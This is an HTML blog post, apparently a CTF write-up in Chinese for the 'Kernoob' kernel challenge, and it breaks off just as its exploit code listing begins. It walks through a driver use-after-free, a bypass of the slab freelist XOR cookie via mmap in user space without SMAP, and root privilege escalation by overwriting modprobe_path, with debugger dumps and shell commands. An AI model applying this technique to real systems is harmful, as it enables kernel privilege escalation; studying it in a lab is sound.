@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="referrer" content="no-referrer" />
+    <meta name="description" content="赛后才知道题目本身因为出题和部署失误附件有flag，而且可以通过修改&#x2F;bin&#x2F;umount直接在exit适时候提权（qemu部署下，文件权限不严格应该都会有这个锅）不过赛时终归是用驱动UAF正常解法做出来的，大部分时间在找一条利用链来bypass kmalloc分配较小堆块、存在xor时，如何分配chunk到内核空间并不产生crash，在分配后恢复堆空间： Analyze1234567891011">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kernoob: kmalloc without SMAP">
+<meta property="og:url" content="http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/index.html">
+<meta property="og:site_name" content="Kirin&#39;s Blog">
+<meta property="og:description" content="赛后才知道题目本身因为出题和部署失误附件有flag，而且可以通过修改&#x2F;bin&#x2F;umount直接在exit适时候提权（qemu部署下，文件权限不严格应该都会有这个锅）不过赛时终归是用驱动UAF正常解法做出来的，大部分时间在找一条利用链来bypass kmalloc分配较小堆块、存在xor时，如何分配chunk到内核空间并不产生crash，在分配后恢复堆空间： Analyze1234567891011">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-4f90bf4d73b2ef0a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="article:published_time" content="2020-03-10T06:44:18.000Z">
+<meta property="article:modified_time" content="2020-03-10T06:45:00.304Z">
+<meta property="article:author" content="Kirin">
+<meta property="article:tag" content="kernel">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/7434375-4f90bf4d73b2ef0a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Kernoob: kmalloc without SMAP</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/01/01/Heap-in-Windows/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/&text=Kernoob: kmalloc without SMAP" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/&title=Kernoob: kmalloc without SMAP" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/&is_video=false&description=Kernoob: kmalloc without SMAP" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Kernoob: kmalloc without SMAP&body=Check out this article: http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/&title=Kernoob: kmalloc without SMAP" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/&title=Kernoob: kmalloc without SMAP" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/&title=Kernoob: kmalloc without SMAP" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/&title=Kernoob: kmalloc without SMAP" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/&name=Kernoob: kmalloc without SMAP&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie-leak"><span class="toc-number">2.1.</span> <span class="toc-text">cookie leak</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bypass-crash"><span class="toc-number">2.2.</span> <span class="toc-text">bypass crash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get-flag"><span class="toc-number">2.3.</span> <span class="toc-text">get flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN"><span class="toc-number">3.</span> <span class="toc-text">PWN</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Kernoob: kmalloc without SMAP
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Kirin's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2020-03-10T06:44:18.000Z" itemprop="datePublished">2020-03-10</time>
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/kernel/" rel="tag">kernel</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>赛后才知道题目本身因为出题和部署失误附件有flag，而且可以通过修改/bin/umount直接在exit适时候提权（qemu部署下，文件权限不严格应该都会有这个锅）<br>不过赛时终归是用驱动UAF正常解法做出来的，大部分时间在找一条利用链来bypass kmalloc分配较小堆块、存在xor时，如何分配chunk到内核空间并不产生crash，在分配后恢复堆空间：</p>
+<h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">stty intr ^]</span><br><span class="line">cd &#96;dirname $0&#96;</span><br><span class="line">timeout --foreground 600 qemu-system-x86_64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &#39;console&#x3D;ttyS0 loglevel&#x3D;3 pti&#x3D;off oops&#x3D;panic panic&#x3D;1 nokaslr&#39; \</span><br><span class="line">    -monitor &#x2F;dev&#x2F;null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp 2,cores&#x3D;2,threads&#x3D;1 \</span><br><span class="line">    -cpu qemu64,smep 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+<p>注意到没有开启kalsr和smap<br>内核加载了noob驱动，在ioctl的0x30001操作中在delete时存在UAF：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __usercall del_note@&lt;rax&gt;(__int64 a1@&lt;rbp&gt;, _QWORD *a2@&lt;rdi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a2);</span><br><span class="line">  v3 = *((_QWORD *)&amp;pool + <span class="number">2</span> * *a2);</span><br><span class="line">  <span class="keyword">if</span> ( *a2 &gt; <span class="number">0x1F</span>uLL )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  kfree(v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但是堆块大小受限制，需在0x20-0x70之间，且能分配0x20个note</p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>原本想法：因为没有开启kalsr，驱动载入地址已知，直接利用UAF修改chunk的fd到驱动的&amp;pool，将chunk分配到&amp;pool上，便可以修改pool里的指针，完成任意地址读写，而后直接修改modprobe_path并打开一个非法格式的ELF触发提权<br>但是直接修改fd会crash，看到堆的结构：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10xg 0xffff880007452ae0</span><br><span class="line">0xffff880007452ae0:	0x0b34d695ef7af0e8	0x0000000000000000</span><br><span class="line">0xffff880007452af0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff880007452b00:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff880007452b10:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff880007452b20:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>并非直接指向fd，猜测有一层xor cookie（之前的chunk直接指向fd，没注意到这一点），通过硬件断点找到xor位置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF81242D10                 movsxd  r8, dword ptr [r9+20h]</span><br><span class="line">.text:FFFFFFFF81242D14                 mov     rdi, [r9]</span><br><span class="line">.text:FFFFFFFF81242D17                 lea     rcx, [rdx+1]</span><br><span class="line">.text:FFFFFFFF81242D1B                 mov     rax, r12</span><br><span class="line">.text:FFFFFFFF81242D1E                 add     r8, r12</span><br><span class="line">.text:FFFFFFFF81242D21                 mov     r11, [r8]</span><br><span class="line">.text:FFFFFFFF81242D24                 xor     r11, [r9+140h]</span><br><span class="line">.text:FFFFFFFF81242D2B                 mov     rbx, r8</span><br><span class="line">.text:FFFFFFFF81242D2E                 xor     rbx, r11</span><br><span class="line">.text:FFFFFFFF81242D31                 lea     rsi, [rdi]</span><br><span class="line">.text:FFFFFFFF81242D34                 call    sub_FFFFFFFF81984E70</span><br><span class="line">.text:FFFFFFFF81242D39                 test    al, al</span><br><span class="line">.text:FFFFFFFF81242D3B                 jz      short loc_FFFFFFFF81242CE9</span><br><span class="line">.text:FFFFFFFF81242D3D                 cmp     r8, r11</span><br><span class="line">.text:FFFFFFFF81242D40                 jz      short loc_FFFFFFFF81242D56</span><br><span class="line">.text:FFFFFFFF81242D42                 movsxd  rax, dword ptr [r9+20h]</span><br><span class="line">.text:FFFFFFFF81242D46                 add     rbx, rax</span><br><span class="line">.text:FFFFFFFF81242D49                 xor     rbx, [rbx]</span><br><span class="line">.text:FFFFFFFF81242D4C                 xor     rbx, [r9+140h]</span><br><span class="line">.text:FFFFFFFF81242D53                 prefetcht0 byte ptr [rbx]</span><br></pre></td></tr></table></figure>
+<p>实现位置在:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; # cat &#x2F;proc&#x2F;kallsyms | grep -i FFFFFFFF81242C80</span><br><span class="line">ffffffff81242c80 T __kmalloc</span><br><span class="line">&#x2F; #</span><br></pre></td></tr></table></figure>
+<p>这里看汇编就可以大致明白<br><strong>(因为时间原因，这里只是通过汇编大致猜测的机制，kmalloc也是时候重看一遍了，等有时间仔细研究过再具体说明)</strong>：<br>在chunk位置写入的是:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*chunk&#x3D;chunk^next_chunk^cookie</span><br></pre></td></tr></table></figure>
+<p>并且当*chunk=chunk^cookie时不会继续从这里分配（尾节点）<br>我们主要需要解决的问题：</p>
+<ul>
+<li>cookie的leak</li>
+<li>需要bypass：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF81242D49                 xor     rbx, [rbx]</span><br><span class="line">.text:FFFFFFFF81242D4C                 xor     rbx, [r9+140h]</span><br><span class="line">.text:FFFFFFFF81242D53                 prefetcht0 byte ptr [rbx]</span><br></pre></td></tr></table></figure>
+<h4 id="cookie-leak"><a href="#cookie-leak" class="headerlink" title="cookie leak"></a>cookie leak</h4>当我们分配chunk时会发现，有很大概率，堆里包含指向自己chunk+0x28的指针：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10xg 0xffff880005b33480</span><br><span class="line">0xffff880005b33480:	0xf4cb5e95eac9ca68	0x0000000000000000</span><br><span class="line">0xffff880005b33490:	0xffff880005b9d9c0	0x0000000000000000</span><br><span class="line">0xffff880005b334a0:	0x0000000000000000	0xffff880005b334a8</span><br><span class="line">0xffff880005b334b0:	0xffff880005b334a8	0x0000000000000001</span><br><span class="line">0xffff880005b334c0:	0x0000000000000000	0xffff880005b334c8</span><br></pre></td></tr></table></figure>
+0xffff880005b334a8-0x28=0xffff880005b33480<br>只需已知两个chunk的地址，即可构造delete链，并利用UAF和<code>*chunk=chunk^next_chunk^cookie</code>或者<code>*chunk=chunk^cookie</code>来拿到cookie,<strong>不过后来发现环境里这里实际是一个定值：0xb34d695ef7afee8，所以这里不确定是否与环境有关，等彻底研究过具体分配机制再分享一下</strong><h4 id="bypass-crash"><a href="#bypass-crash" class="headerlink" title="bypass crash"></a>bypass crash</h4>驱动地址：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> # cat &#x2F;proc&#x2F;modules |grep noob</span><br><span class="line">noob 16384 0 - Live 0xffffffffc0002000 (OE)</span><br></pre></td></tr></table></figure>
+如果直接通过<code>*chunk=chunk^next_chunk^cookie</code>将fd指向驱动pool位置，则在经过一系列xor后：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF81242D49                 xor     rbx, [rbx]</span><br><span class="line">.text:FFFFFFFF81242D4C                 xor     rbx, [r9+140h]</span><br><span class="line">.text:FFFFFFFF81242D53                 prefetcht0 byte ptr [rbx]</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>*pool位置为0或者是一个堆块地址，所以经过xor后rbx会等于一个很大的值，是一个非法地址，从而crash，且驱动中数据不可控，所以这里需要bypass<br>首先想到的方法：</p>
+<ul>
+<li>我们要让这里pool中数据可控，使得此处的值经过xor后可以落入一个合法地址 </li>
+<li>考虑经过xor后使rbx高位为0即可，这样由于没有开启smap保护，直接在用户空间mmap一个空间，使地址合法即可</li>
+<li>所以我们可以在pool中写入四字节可控数据即可保证xor时落入用户空间 </li>
+<li>能写入四字节的只有堆块指针，所以先伪造一个fd指向用户空间，用户空间完全可控，所以可以直接bypass来防止crash，且地址mmap生成，所以可以是任意四字节，成功分配后此地址写入pool </li>
+<li>pool中存在可控的四字节，我们不按照8字节对齐，使得四字节指针在高位，由于这里可控，所以可以使得xor后高字节为0，重新落入用户空间，此时设置最后一个堆<code>*chunk=chunk^cookie</code>即可恢复堆，此时即可成功分配一个chunk到驱动的pool，而后任意地址写即可</li>
+</ul>
+<p><strong>具体操作：</strong></p>
+<ul>
+<li>delete两个chunk 2 -&gt; 1<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffff880005bcb420 &#x3D;&gt; 0xffff880007444cc0</span><br></pre></td></tr></table></figure></li>
+<li>修改chunk 2的fd=cookie^chunk_address^fake_chunk，使得可以分配一个fake_chunk地址到pool，用于下面的bypass xor，所以fake_chunk=(cookie^pool_ko)&gt;&gt;32<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk：0x00000000f4cb296a</span><br><span class="line">0xffffffffc00045c0:	0xffff880005bcb960	0x0000000000000060</span><br><span class="line">0xffffffffc00045d0:	0xffff880005bcb660	0x0000000000000060</span><br><span class="line">0xffffffffc00045e0:	0xffff880005bcba20	0x0000000000000060</span><br><span class="line">0xffffffffc00045f0:	0xffff880005bcb420	0x0000000000000060</span><br><span class="line">0xffffffffc0004600:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc0004610:	0xffff880005bcb420	0x0000000000000060</span><br><span class="line">0xffffffffc0004620:	0x00000000f4cb296a	0x0000000000000060</span><br><span class="line">0xffffffffc0004630:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></li>
+<li>在最后分配chunk到pool时，位置fd指向pool_ko-4，[pool_ko]=fake_chunk ,[pool_ko-4]=fake_chunk&lt;&lt;32,经过xor使得将要处理的next_chunk(上面提到的rbx)高地址为0，指向用户空间，在用户空间mmap使得地址合法即可<br>利用地址差将之前写入的fake_chunk指针在高地址<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10xg 0xffffffffc000461c</span><br><span class="line">0xffffffffc000461c:	0xf4cb296a00000000	0x0000006000000000</span><br><span class="line">0xffffffffc000462c:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></li>
+<li>xor后高地址为0，rbx落入用户空间：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x2f7ab8f4 ◂— sbb    al, 0x46 &#x2F;* 0xb34d695c000461c *&#x2F;</span><br><span class="line"> RCX  0x1184</span><br><span class="line"> RDX  0x1183</span><br><span class="line"> RDI  0x270c0</span><br><span class="line"> RSI  0x0</span><br><span class="line"> R8   0xffffffffc000461c ◂— add    byte ptr [rax], al &#x2F;* 0xf4cb296a00000000 *&#x2F;</span><br><span class="line"> R9   0xffff880006401600 ◂— sal    byte ptr [rax + 2], 0 &#x2F;* 0x270c0 *&#x2F;</span><br><span class="line"> R10  0x0</span><br><span class="line"> R11  0xffffffffef7afee8</span><br><span class="line"> R12  0xffffffffc000461c ◂— add    byte ptr [rax], al &#x2F;* 0xf4cb296a00000000 *&#x2F;</span><br><span class="line"> R13  0x14000c0</span><br><span class="line"> R14  0x60</span><br><span class="line"> R15  0xffff880006401600 ◂— sal    byte ptr [rax + 2], 0 &#x2F;* 0x270c0 *&#x2F;</span><br><span class="line"> RBP  0xffffc900001dfdf8 —▸ 0xffffc900001dfe30 —▸ 0xffffc900001dfe60 —▸ 0xffffc900001dfee8 —▸ 0xffffc900001dff28 ◂— ...</span><br><span class="line"> RSP  0xffffc900001dfdc8 —▸ 0xffffffffc00020d1 ◂— mov    qword ptr [rbp - 0x10], rax &#x2F;* 0xf07d8348f0458948 *&#x2F;</span><br><span class="line"> RIP  0xffffffff81242d49 ◂— 0x1409933491b3348</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► 0xffffffff81242d49    xor    rbx, qword ptr [rbx]</span><br><span class="line">   0xffffffff81242d4c    xor    rbx, qword ptr [r9 + 0x140]</span><br><span class="line">   0xffffffff81242d53    prefetcht0 byte ptr [rbx]</span><br><span class="line">   0xffffffff81242d56    test   r13d, 0x8000</span><br><span class="line">   0xffffffff81242d5d    jne    0xffffffff81242e55</span><br><span class="line"> </span><br><span class="line">   0xffffffff81242d63    nop    </span><br><span class="line">   0xffffffff81242d68    mov    rax, qword ptr [rbp + 8]</span><br><span class="line">   0xffffffff81242d6c    movsxd rbx, dword ptr [r15 + 0x18]</span><br><span class="line">   0xffffffff81242d70    mov    qword ptr [rbp - 0x30], rax</span><br><span class="line">   0xffffffff81242d74    nop    </span><br><span class="line">   0xffffffff81242d79    add    rsp, 8</span><br></pre></td></tr></table></figure></li>
+<li>将最后mmap的chunk布置为*chunk=chunk^cookie防止crash即可<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10xg 0x2f7ab8f4</span><br><span class="line">0x2f7ab8f4:	0x0b34d695c000461c	0x0000000000000000</span><br><span class="line">0x2f7ab904:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x2f7ab914:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x2f7ab924:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x2f7ab934:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<h4 id="get-flag"><a href="#get-flag" class="headerlink" title="get flag"></a>get flag</h4>修改modprobe_path指向/home/pwn/exp/copy.sh:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">x&#x2F;s 0xffffffff8245aba0</span><br><span class="line">0xffffffff8245aba0:	&quot;&#x2F;home&#x2F;pwn&#x2F;exp&#x2F;copy.sh&quot;</span><br><span class="line"></span><br><span class="line">&#x2F;home&#x2F;pwn&#x2F;exp&#x2F;copy.sh:</span><br><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">&#x2F;bin&#x2F;cp &#x2F;flag &#x2F;home&#x2F;pwn&#x2F;flag</span><br><span class="line">&#x2F;bin&#x2F;chmod 777 &#x2F;home&#x2F;pwn&#x2F;flag</span><br></pre></td></tr></table></figure>
+而后打开一个非法格式ELF触发即可以root身份运行copy.sh<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -ne &#39;\xff\xff\xff\xff&#39; &gt; &#x2F;home&#x2F;pwn&#x2F;exp&#x2F;kirin</span><br><span class="line">.&#x2F;kirin</span><br></pre></td></tr></table></figure>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span 